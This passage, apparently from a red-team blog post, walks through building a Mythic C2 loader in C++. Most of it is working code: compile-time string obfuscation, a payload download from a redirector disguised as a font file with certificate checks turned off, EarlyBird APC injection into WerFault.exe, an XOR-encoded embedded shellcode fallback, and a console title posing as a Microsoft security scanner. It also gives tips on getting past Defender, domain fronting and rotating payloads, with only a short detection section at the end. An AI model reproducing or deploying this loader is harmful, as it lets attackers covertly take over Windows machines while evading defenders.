OBFSTR(str) (ObfuscatedString\u0026#x3C;sizeof(str)\u003e(str).decrypt())\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis works because the encryption happens at compile time rather than runtime. The constexpr constructor means the XOR encryption occurs when the code is compiled, not when it executes. The strings get stored encrypted in the binary and are only decrypted when actually needed. Static analysis tools scanning the executable won't find your target URLs or other sensitive strings in plaintext.\u003c/p\u003e\n\u003cp\u003eThe OBFSTR macro makes this easy to use throughout the code - you just wrap any string with it and the obfuscation happens automatically.\u003c/p\u003e\n\u003ch3\u003eThe Main Loader Class\u003c/h3\u003e\n\u003cp\u003eThe loader is built around a single class that encapsulates all the functionality:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003eclass AdvancedPayloadLoader {\nprivate:\n    std::vector\u0026#x3C;BYTE\u003e payload;\n    std::mt19937 rng;\n    \n    // Simplified stealth configuration\n    struct StealthConfig {\n        bool useJitteredSleep = true;\n    } stealthConfig;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe design is clean and focused. The payload vector stores the downloaded shellcode, while the random number generator provides randomization for evasion techniques. The StealthConfig struct controls behavioral features like jittered sleep timing. This keeps the loader lightweight while still providing the necessary evasion capabilities.\u003c/p\u003e\n\u003ch3\u003eJittered Sleep for Evasion\u003c/h3\u003e\n\u003cp\u003eThe loader implements smart timing evasion through jittered sleep:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    // Jittered sleep for evasion\n    void JitteredSleep(DWORD minMs, DWORD maxMs) {\n        std::uniform_int_distribution\u0026#x3C;DWORD\u003e dist(minMs, maxMs);\n        DWORD sleepTime = dist(rng);\n        Sleep(sleepTime);\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is a simple but effective evasion technique. Instead of predictable delays that behavioral analysis tools can detect, we use random intervals within a specified range. This makes the loader's timing patterns look more like legitimate software that might pause for user interaction or system resources.\u003c/p\u003e\n\u003cp\u003eThe uniform distribution ensures the delays are truly random within the specified bounds, breaking up any timing signatures that security tools might look for.\u003c/p\u003e\n\u003ch3\u003eEarlyBird Injection Implementation\u003c/h3\u003e\n\u003cp\u003eThe EarlyBird injection is the core technique that makes this loader effective against modern defenses:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    // Early Bird APC Queue Injection\n    bool EarlyBirdInjection(const std::wstring\u0026#x26; targetPath) {\n        LOG(\"Starting EarlyBird injection on \" + std::string(targetPath.begin(), targetPath.end()));\n        \n        STARTUPINFOW si = { sizeof(si) };\n        PROCESS_INFORMATION pi = {};\n        si.dwFlags = STARTF_USESHOWWINDOW;\n        si.wShowWindow = SW_HIDE;\n        \n        if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,\n            CREATE_SUSPENDED, NULL, NULL, \u0026#x26;si, \u0026#x26;pi)) {\n            LOG_ERROR(\"Failed to create suspended process\");\n            return false;\n        }\n        \n        LOG(\"Created suspended process (PID: \" + std::to_string(pi.dwProcessId) + \")\");\n\n        LPVOID pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payload.size(),\n            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        \n        if (!pRemoteMemory) {\n            LOG_ERROR(\"Failed to allocate memory\");\n            TerminateProcess(pi.hProcess, 0);\n            CloseHandle(pi.hProcess);\n            CloseHandle(pi.hThread);\n            return false;\n        }\n        \n        SIZE_T bytesWritten;\n        if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, payload.data(), payload.size(), \u0026#x26;bytesWritten)) {\n            LOG_ERROR(\"Failed to write memory\");\n            VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);\n            TerminateProcess(pi.hProcess, 0);\n            CloseHandle(pi.hProcess);\n            CloseHandle(pi.hThread);\n            return false;\n        }\n\n        QueueUserAPC((PAPCFUNC)pRemoteMemory, pi.hThread, 0);\n        \n        ResumeThread(pi.hThread);\n        return true;\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe technique works by creating a process in a suspended state using CreateProcessW with the CREATE_SUSPENDED flag. This creates the process but doesn't start the main thread, giving us time to inject our code. We then use VirtualAllocEx to allocate memory in the target process with execute permissions and WriteProcessMemory to write our shellcode to that allocated memory.\u003c/p\u003e\n\u003cp\u003eThe key is QueueUserAPC, which adds our shellcode to the thread's APC queue. When we call ResumeThread to start the process, Windows checks if the thread has any queued APCs and executes them before starting the thread's main function. This means our shellcode executes before the legitimate process code, giving us control from the very beginning of the process lifecycle.\u003c/p\u003e\n\u003cp\u003eWerFault.exe (Windows Error Reporting) is an ideal injection target because it's a legitimate system process that runs regularly, has network access for sending error reports to Microsoft, and is less likely to be monitored than other system processes.\u003c/p\u003e\n\u003ch3\u003eThe Download System Deep Dive\u003c/h3\u003e\n\u003cp\u003eThe loader implements a sophisticated multi-tier download system with realistic HTTP behavior:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    // Enhanced HTTPS download with full fallback system\n    bool DownloadPayload() {\n        LOG(\"Initiating payload download with 2-tier fallback system\");\n        \n        // Primary URL (your original payload server)\n        std::string primaryHost = OBFSTR(\"dl.example-business.com\");\n        std::string primaryPath = OBFSTR(\"/assets/fonts/manrope-light.ttf\");\n        \n        // Fallback URL (Google Fonts for stealth)\n        std::string fallbackHost = OBFSTR(\"fonts.googleapis.com\");\n        std::string fallbackPath = OBFSTR(\"/css2?family=Open+Sans:wght@300;400;600;700\u0026#x26;display=swap\");\n        \n        // Try primary URL first\n        LOG(\"Attempting download from primary server...\");\n        if (AttemptDownload(primaryHost, primaryPath)) {\n            LOG(\"Primary download successful\");\n            return true;\n        }\n        \n        LOG(\"Primary download failed, trying fallback server...\");\n        JitteredSleep(2000, 4000);\n        \n        // Try fallback URL\n        if (AttemptDownload(fallbackHost, fallbackPath)) {\n            LOG(\"Fallback download successful\");\n            return true;\n        }\n        \n        LOG(\"All download attempts failed\");\n        return false;\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is clever operational planning. The primary target is your redirector serving the real payload, but if that fails, the loader tries to download from Google Fonts. Obviously Google won't serve your payload, but this maintains the illusion that the loader is just trying to download legitimate web resources.\u003c/p\u003e\n\u003cp\u003eThe obfuscated strings prevent static analysis from revealing your infrastructure, and the jittered sleep between attempts makes the retry behavior look natural.\u003c/p\u003e\n\u003cp\u003eNow let's look at the complete \u003ccode\u003eAttemptDownload\u003c/code\u003e method with all the WinHTTP setup and response handling:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    bool AttemptDownload(const std::string\u0026#x26; host, const std::string\u0026#x26; path) {\n        LOG(\"Initializing download from \" + host);\n        std::wstring wHost(host.begin(), host.end());\n        std::wstring wPath(path.begin(), path.end());\n        \n        // Rotate User-Agents for stealth\n        std::vector\u0026#x3C;std::wstring\u003e userAgents = {\n            L\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\",\n            L\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\",\n            L\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36\"\n        };\n        \n        std::uniform_int_distribution\u0026#x3C;size_t\u003e uaDist(0, userAgents.size() - 1);\n        std::wstring selectedUA = userAgents[uaDist(rng)];\n        \n        HINTERNET hSession = WinHttpOpen(selectedUA.c_str(),\n            WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\n        if (!hSession) return false;\n        \n        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);\n        if (!hConnect) {\n            WinHttpCloseHandle(hSession);\n            return false;\n        }\n        \n        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", wPath.c_str(), NULL,\n            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);\n        if (!hRequest) {\n            WinHttpCloseHandle(hConnect);\n            WinHttpCloseHandle(hSession);\n            return false;\n        }\n        \n        // Certificate bypass and realistic headers\n        DWORD dwSecurityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |\n            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA |\n            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;\n        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, \u0026#x26;dwSecurityFlags, sizeof(dwSecurityFlags));\n        \n        WinHttpAddRequestHeaders(hRequest, L\"Accept: text/css,*/*;q=0.1\", -1, WINHTTP_ADDREQ_FLAG_ADD);\n        WinHttpAddRequestHeaders(hRequest, L\"Accept-Language: en-US,en;q=0.9\", -1, WINHTTP_ADDREQ_FLAG_ADD);\n        WinHttpAddRequestHeaders(hRequest, L\"Cache-Control: no-cache\", -1, WINHTTP_ADDREQ_FLAG_ADD);\n        \n        JitteredSleep(1000, 3000);\n        \n        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,\n            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {\n            WinHttpCloseHandle(hRequest);\n            WinHttpCloseHandle(hConnect);\n            WinHttpCloseHandle(hSession);\n            return false;\n        }\n        \n        // Read response\n        std::vector\u0026#x3C;BYTE\u003e downloadData;\n        DWORD dwSize = 0;\n        do {\n            DWORD dwDownloaded = 0;\n            if (WinHttpQueryDataAvailable(hRequest, \u0026#x26;dwSize) \u0026#x26;\u0026#x26; dwSize \u003e 0) {\n                std::vector\u0026#x3C;BYTE\u003e buffer(dwSize);\n                if (WinHttpReadData(hRequest, buffer.data(), dwSize, \u0026#x26;dwDownloaded)) {\n                    downloadData.insert(downloadData.end(), buffer.begin(), buffer.begin() + dwDownloaded);\n                }\n            }\n        } while (dwSize \u003e 0);\n        \n        WinHttpCloseHandle(hRequest);\n        WinHttpCloseHandle(hConnect);\n        WinHttpCloseHandle(hSession);\n        \n        if (!downloadData.empty()) {\n            LOG(\"Downloaded \" + std::to_string(downloadData.size()) + \" bytes\");\n            payload = downloadData; // Payload is downloaded directly over HTTPS; no additional XOR decryption is applied here.\n            LOG(\"Payload ready (no decryption needed)\");\n            return true;\n        }\n        \n        return false;\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows the complete HTTP download flow. The WinHTTP session setup creates session, connection, and request handles with proper error checking and cleanup at each step. The security flags are configured to ignore various certificate validation issues, such as invalid common names or expired dates. While this simplifies the download process and allows for the use of self-signed or expired certificates in controlled testing environments, it is a significant OPSEC drawback in real-world red team operations. Advanced network security tools and SOCs can easily flag the use of these bypass flags as suspicious, as legitimate software rarely ignores such critical security checks. For true operational stealth, all certificates should be valid and properly configured.\u003c/p\u003e\n\u003cp\u003eThe Accept headers make the request look like a browser requesting a CSS or font file rather than suspicious automated traffic. There's a random jittered sleep before sending the request to avoid timing signatures that behavioral analysis tools might detect.\u003c/p\u003e\n\u003cp\u003eThe response reading loop uses WinHttpQueryDataAvailable and WinHttpReadData to read the response in chunks, accumulating all the data. Once we have the complete payload, it's ready to execute directly without additional decryption since it was already protected by the HTTPS transport.\u003c/p\u003e\n\u003ch3\u003eThe Execute Method\u003c/h3\u003e\n\u003cp\u003eThe \u003cstrong\u003eExecute\u003c/strong\u003e method orchestrates the complete loader workflow:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    bool Execute() {\n        LOG(\"========================================\");\n        LOG(\"  Testing EarlyBird Injection Technique against W11\");\n        LOG(\"========================================\");\n        \n        JitteredSleep(3000, 7000);\n        \n        // Try to download payload\n        bool downloadSuccess = DownloadPayload();\n        if (!downloadSuccess) {\n            LOG(\"Using embedded fallback payload\");\n            payload = GetEmbeddedPayload();\n            if (payload.empty()) {\n                LOG_ERROR(\"No payload available\");\n                return false;\n            }\n        }\n        \n        // Test EarlyBirdInjection on WerFault.exe\n        std::vector\u0026#x3C;std::wstring\u003e targets = {\n            L\"C:\\\\Windows\\\\System32\\\\WerFault.exe\"  // Windows Error Reporting\n        };\n        \n        bool success = false;\n        \n        for (const auto\u0026#x26; target : targets) {\n            std::string targetStr(target.begin(), target.end());\n            LOG(\"Testing EarlyBirdInjection on target: \" + targetStr);\n            \n            if (EarlyBirdInjection(target)) {\n                success = true;\n                LOG(\"Injection succeeded on \" + targetStr);\n            } else {\n                LOG_ERROR(\"Injection failed on \" + targetStr);\n            }\n        }\n        \n        return success;\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe execution flow starts with an initial jittered delay to avoid looking like automated malware. It then attempts to download the payload from the C2 infrastructure, but falls back to an embedded payload if the download fails for any reason. Once we have a payload, it injects into WerFault.exe using the EarlyBird technique and returns a success or failure status.\u003c/p\u003e\n\u003cp\u003eThe GetEmbeddedPayload method provides a fallback when network access fails:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    std::vector\u0026#x3C;BYTE\u003e GetEmbeddedPayload() {\n        LOG(\"Loading embedded fallback payload\");\n        // Simple calc.exe shellcode (example)\n        std::vector\u0026#x3C;BYTE\u003e embedded = {\n            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff,\n            0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x7c,\n            0x21, 0x41, 0x5e, 0xe2, 0xb5, 0xfe, 0xa0, 0x48, 0x31, 0x58,\n            0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4\n        };\n        \n        std::vector\u0026#x3C;BYTE\u003e key = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };\n        XorCrypt(embedded, key);\n        return embedded;\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis GetEmbeddedPayload method provides a basic calc.exe shellcode, purely as a demonstrative fallback example. In real-world operations, you'd typically embed a lightweight Apollo beacon here, designed to establish initial contact and then pull down the full, more capable payload from your C2 infrastructure.\u003c/p\u003e\n\u003ch3\u003eThe Main Entry Point\u003c/h3\u003e\n\u003cp\u003eThe main function and class structure keep things clean:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003epublic:\n    AdvancedPayloadLoader() : rng(std::random_device{}()) {}\n\n    int Run() {\n        SetConsoleTitleA(OBFSTR(\"Microsoft Windows Advanced Security Scanner\").c_str());\n        // In a production build, console logging (LOG and LOG_ERROR) would typically be removed\n\t\t// or redirected to avoid leaving traces on the target system.\n        //\n        //It's crucial to note that while the provided code includes console logging (via LOG and LOG_ERROR macros) for demonstration and debugging, this logging must be removed or redirected in a true operational scenario. Leaving console output active provides easy traces for defenders on a target system, severely compromising the loader's stealth.\n        try {\n            bool result = Execute();\n            \n            if (result) {\n                LOG(\"========================================\");\n                LOG(\"  MISSION ACCOMPLISHED!\");\n                LOG(\"========================================\");\n            } else {\n                LOG_ERROR(\"Mission failed\");\n            }\n            \n            return result ? 0 : 1;\n        }\n        catch (...) {\n            LOG_ERROR(\"Unhandled exception occurred\");\n            return 1;\n        }\n    }\n};\n\nint main() {\n    AdvancedPayloadLoader loader;\n    return loader.Run();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe obfuscated console title makes the loader look like a legitimate security tool if someone sees it running. The exception handling ensures clean exit even if something goes wrong.\u003c/p\u003e\n\u003ch2\u003ePart 5: Putting It All Together\u003c/h2\u003e\n\u003cp\u003eThe complete execution flow looks like this:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLoader Starts\u003c/strong\u003e: Our compiled executable starts and initializes its stealth features.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDownload Attempt\u003c/strong\u003e: It tries to download the payload from \u003ccode\u003edl.example-business.com/assets/fonts/manrope-light.ttf\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRedirector Forwards\u003c/strong\u003e: Our Nginx redirector receives the request and forwards it to the Mythic server.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePayload Retrieved\u003c/strong\u003e: The Apollo shellcode is downloaded and stored in memory.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eProcess Creation\u003c/strong\u003e: A suspended WerFault.exe process is created.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMemory Injection\u003c/strong\u003e: The shellcode is written to the process memory.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAPC Queue\u003c/strong\u003e: An APC is queued to execute our code.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eProcess Resume\u003c/strong\u003e: The process resumes and our shellcode executes.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eC2 Connection\u003c/strong\u003e: The Apollo agent connects back to \u003ccode\u003eapi.example-business.com\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRedirector Forwards\u003c/strong\u003e: Our redirector forwards the C2 traffic to the Mythic server.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSession Established\u003c/strong\u003e: We now have a live session in the Mythic interface.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003ePart 6: OPSEC Considerations\u003c/h2\u003e\n\u003ch3\u003eBasic vs. Advanced OPSEC\u003c/h3\u003e\n\u003cp\u003eWhile the techniques described here significantly enhance operational security compared to direct C2 connections or dropping files, it's important to differentiate between foundational OPSEC and highly advanced tradecraft.\u003c/p\u003e\n\u003cp\u003eFor example, relying on basic SSL certificate bypass flags (\u003ccode\u003eSECURITY_FLAG_IGNORE_...\u003c/code\u003e) in your loader, while functional for demonstrating the principle, is a strong indicator to advanced network security tools and security operations centers (SOCs). In real-world, high-stakes scenarios, significant effort is placed on ensuring \u003cem\u003eall\u003c/em\u003e components exhibit entirely legitimate behavior, including strict adherence to valid and properly configured SSL certificates, to avoid leaving even subtle traces or triggering automated alerts. The goal is to be indistinguishable from normal, legitimate traffic.\u003c/p\u003e\n\u003cp\u003eThis setup includes several important operational security features:\u003c/p\u003e\n\u003ch3\u003eTraffic Analysis Resistance\u003c/h3\u003e\n\u003cp\u003eAll our C2 traffic flows through legitimate-looking HTTPS connections. Network monitoring tools see:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNormal WordPress traffic to www.example-business.com\u003c/li\u003e\n\u003cli\u003eAPI calls to api.example-business.com (looks like a business API)\u003c/li\u003e\n\u003cli\u003eFont downloads from dl.example-business.com\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNothing looks suspicious at the network level.\u003c/p\u003e\n\u003ch3\u003eProcess Injection Stealth\u003c/h3\u003e\n\u003cp\u003eEarlyBird injection is particularly stealthy because:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIt doesn't create new processes that might trigger alerts\u003c/li\u003e\n\u003cli\u003eThe injection happens during normal process initialization\u003c/li\u003e\n\u003cli\u003eThe target process (WerFault.exe) is expected to run periodically\u003c/li\u003e\n\u003cli\u003eThe injected payload itself doesn't touch the disk; it lives and breathes entirely in memory, thanks to our loader.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eString Obfuscation\u003c/h3\u003e\n\u003cp\u003eOur compile-time string obfuscation prevents static analysis tools from easily identifying:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTarget URLs\u003c/li\u003e\n\u003cli\u003eProcess names\u003c/li\u003e\n\u003cli\u003eSuspicious API calls\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eBehavioral Evasion\u003c/h3\u003e\n\u003cp\u003eThe jittered sleep patterns and realistic HTTP headers make our loader behave more like legitimate software than malware.\u003c/p\u003e\n\u003ch2\u003ePart 7: Advanced Operational Techniques and Further Considerations\u003c/h2\u003e\n\u003cp\u003eOnce you have this foundational infrastructure running, there are several ways to enhance its stealth and resilience. These techniques build upon the principles demonstrated earlier:\u003c/p\u003e\n\u003ch3\u003eDomain Categorization\u003c/h3\u003e\n\u003cp\u003eRegister your domains well in advance and get them categorized by web filtering services. A domain categorized as \"Business\" or \"Technology\" is much less likely to be blocked than an uncategorized one.\u003c/p\u003e\n\u003ch3\u003eCDN Integration and True Domain Fronting\u003c/h3\u003e\n\u003cp\u003eConsider putting your redirectors behind a Content Delivery Network (CDN) like Cloudflare, AWS CloudFront, or Google Cloud CDN. This adds another layer of protection by masking your actual redirector IP and can enable \u003cstrong\u003etrue domain fronting\u003c/strong\u003e. True domain fronting occurs when the \u003ccode\u003eHost\u003c/code\u003e header sent to the CDN (which the CDN uses to route your request) is different from the \u003ccode\u003eHost\u003c/code\u003e header seen by the CDN's edge server from the client (which typically points to a legitimate high-reputation domain). This allows your C2 traffic to blend in with legitimate traffic directed to a well-known service, hiding your actual C2 domain from network monitoring until it hits the CDN's internal routing.\u003c/p\u003e\n\u003ch3\u003eMultiple Redirector Chains\u003c/h3\u003e\n\u003cp\u003eFor high-value operations, consider chaining multiple redirectors. Traffic flows through 2-3 redirectors before reaching your actual C2 server. This adds complexity for defenders to trace back to your ultimate source.\u003c/p\u003e\n\u003ch3\u003ePayload Rotation and Obfuscation\u003c/h3\u003e\n\u003cp\u003eImplement automatic payload rotation so that even if one payload gets burned, your infrastructure can quickly switch to new ones. Beyond simple XOR, integrate more sophisticated runtime payload decryption, polymorphic loaders, and code caves to make static and dynamic analysis harder.\u003c/p\u003e\n\u003ch2\u003ePart 8: Testing Against Updated Defenses\u003c/h2\u003e\n\u003cp\u003eBefore we dive into detection and mitigation, let's verify that our technique works against fully updated Windows Defender. Here's the status of the test system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003ePS C:\\Users\\x\u003e Get-MpComputerStatus | Select-Object AntivirusEnabled, AMServiceEnabled, AntispywareEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated, AntispywareSignatureLastUpdated\n\nAntivirusEnabled                : True\nAMServiceEnabled                : True\nAntispywareEnabled              : True\nBehaviorMonitorEnabled          : True\nIoavProtectionEnabled           : True\nNISEnabled                      : True\nOnAccessProtectionEnabled       : True\nRealTimeProtectionEnabled       : True\nAntivirusSignatureLastUpdated   : 6/18/2025 9:15:19 AM\nAntispywareSignatureLastUpdated : 6/18/2025 9:15:19 AM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows Windows Defender is fully operational with all protection mechanisms enabled and signatures updated the same day. The EarlyBird injection technique successfully bypasses these defenses because it operates during the legitimate process initialization phase, before most behavioral monitoring kicks in.\u003c/p\u003e\n\u003cp\u003eThe key insight here is that even with full real-time protection, behavioral monitoring, and current signatures, the technique remains effective. This demonstrates why understanding process injection mechanics is so important for both offensive and defensive security.\u003c/p\u003e\n\u003ch2\u003ePart 9: Detection and Mitigation\u003c/h2\u003e\n\u003cp\u003eUnderstanding how this attack works also helps with defense. Here are the key detection points:\u003c/p\u003e\n\u003ch3\u003eNetwork Monitoring\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eLook for repeated connections to the same external domains\u003c/li\u003e\n\u003cli\u003eMonitor for unusual User-Agent patterns\u003c/li\u003e\n\u003cli\u003eWatch for SSL connections to recently registered domains\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eProcess Monitoring\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eMonitor for processes created in suspended state\u003c/li\u003e\n\u003cli\u003eWatch for APC queue operations\u003c/li\u003e\n\u003cli\u003eLook for memory allocations with execute permissions\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eBehavioral Analysis\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUnusual network activity from system processes\u003c/li\u003e\n\u003cli\u003eProcesses making connections they normally wouldn't\u003c/li\u003e\n\u003cli\u003eMemory injection patterns\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEach detection point listed here represents an area where defensive tooling is rapidly advancing. Staying ahead requires continuous research and adaptation of attack techniques, constantly refining your methodologies to counter the latest security products and analytical approaches.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eBuilding effective C2 infrastructure requires thinking like both an attacker and a defender. The setup I've shown you demonstrates how multiple techniques can be combined to create a robust, stealthy communication channel that can survive in hostile environments.\u003c/p\u003e\n\u003cp\u003eThe key lessons here are simple but critical for foundational understanding. You need layered communication concepts – redirectors and fallback systems ensure basic operational continuity. Everything from domains to SSL certificates to HTTP headers needs to look consistently normal. Modern process injection techniques like EarlyBird can bypass many detection systems \u003cem\u003eat a basic level\u003c/em\u003e. String obfuscation, jittered timing, and realistic behavior patterns are crucial for initial avoidance.\u003c/p\u003e\n\u003cp\u003eThis infrastructure provides a solid foundation for understanding red team operations. However, remember that the security landscape is constantly evolving. What works today might not work tomorrow, so always be ready to adapt your techniques and infrastructure as defenses improve.\u003c/p\u003e\n\u003cp\u003eMost importantly, you now understand the \u003cstrong\u003eprinciples\u003c/strong\u003e behind why each component works. This foundational knowledge empowers you to adapt, research, and implement far more advanced techniques for your own operations, continuously pushing the boundaries against evolving defensive capabilities.\u003c/p\u003e\n\u003ch2\u003eReferences\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMythic C2 Framework\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/its-a-feature/Mythic\"\u003eMythic: A cross-platform, post-exploit, red teaming framework\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eApollo Agent for Mythic\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/MythicAgents/apollo\"\u003eApollo - A .NET Framework 4.0 Windows Agent\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eHTTP C2 Profile for Mythic\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/MythicC2Profiles/http\"\u003eHTTP C2 Profile for Mythic Framework*\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eEarlyBird Injection Technique\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/\"\u003eNew ‘Early Bird’ Code Injection Technique Discovered*. Cyberark Security Research, 2018.\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eWindows APC Internals\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls\"\u003eAsynchronous Procedure Calls*. Windows Development Documentation.\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eC2 Infrastructure Design Patterns\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://attack.mitre.org/tactics/TA0011/\"\u003eMITRE ATT\u0026#x26;CK Framework. Command and Control Tactics. MITRE Corporation.\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eWinHTTP Programming Interface\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-start-page\"\u003eWinHTTP API Reference. Windows Development Documentation.\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Let's talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and ca...","title":"Mythic C2 with EarlyBird Injection and Defender Evasion","date":"2025-06-23","tags":["Red Team","C2","Mythic","Infrastructure","Process Injection","EarlyBird","OPSEC","Malware Development"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"mythic-c2-early-bird-defender-evasion"},"buildId":"EJgAsPo3Kz3qeohT_5Phd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
